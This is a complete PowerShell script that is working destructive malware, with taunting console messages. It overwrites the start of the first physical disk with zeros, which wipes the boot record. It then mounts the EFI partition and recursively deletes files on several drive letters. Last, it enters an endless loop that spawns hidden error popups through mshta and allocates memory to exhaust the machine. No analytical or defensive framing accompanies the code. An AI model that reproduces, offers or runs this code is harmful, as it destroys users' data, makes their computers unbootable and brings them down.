Write-Host "WARNING: Diabetes incoming!!!!!!!!!" -ForegroundColor Red

# 1
$zeroFile = "zero.bin"
[byte[]]$zeros = 0..0   # 2
Set-Content -Path $zeroFile -Value $zeros -Encoding Byte -Force

# 3
try {
    $d = [System.IO.File]::OpenWrite('\\.\PhysicalDrive0')
    $z = [System.IO.File]::OpenRead($zeroFile)
    $z.CopyTo($d)
    $d.Close()
    $z.Close()
    Write-Host "hhahahhahhahahha."
} catch {
    Write-Host "F(m): $_" -ForegroundColor Yellow
}

Remove-Item $zeroFile -Force -ErrorAction SilentlyContinue

# 4
try {
    $d = [System.IO.File]::OpenWrite('\\.\PhysicalDrive0')
    $buffer = New-Object byte[] 1048576   # 1MB
    $d.Write($buffer, 0, $buffer.Length)
    $d.Close()
    Write-Host "What the f."
} catch {
    Write-Host "Aww man: $_" -ForegroundColor Yellow
}

# 5
function Wipe-MountedVolume {
    param([string]$Letter)
    $drive = "$Letter`:"
    try {
        mountvol $drive /s 2>$null
        if (Test-Path $drive) {
            Write-Host "Clean this ass $drive ..."
            Get-ChildItem "$drive\*" -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
        }
    } catch { }
}

Wipe-MountedVolume "S"
Wipe-MountedVolume "Y"
Wipe-MountedVolume "X"

# RAM eater
# OK.

Write-Host "Get ready..." -ForegroundColor Red

while ($true) {
    # Spam
    Start-Process mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Still using this computer?', 0, 'Error', 16);close()" -WindowStyle Hidden
    Start-Process mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('llisT gnisU sihT retupmoC?', 0, 'Error', 16);close()" -WindowStyle Hidden
    Start-Process mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Oranges are way better you silly tomato', 0, 'Error', 16);close()" -WindowStyle Hidden

    # Destroy memory
    $null = New-Object byte[] (1MB)   # Trust me bro
    Start-Sleep -Milliseconds 50     # kills malwares
}
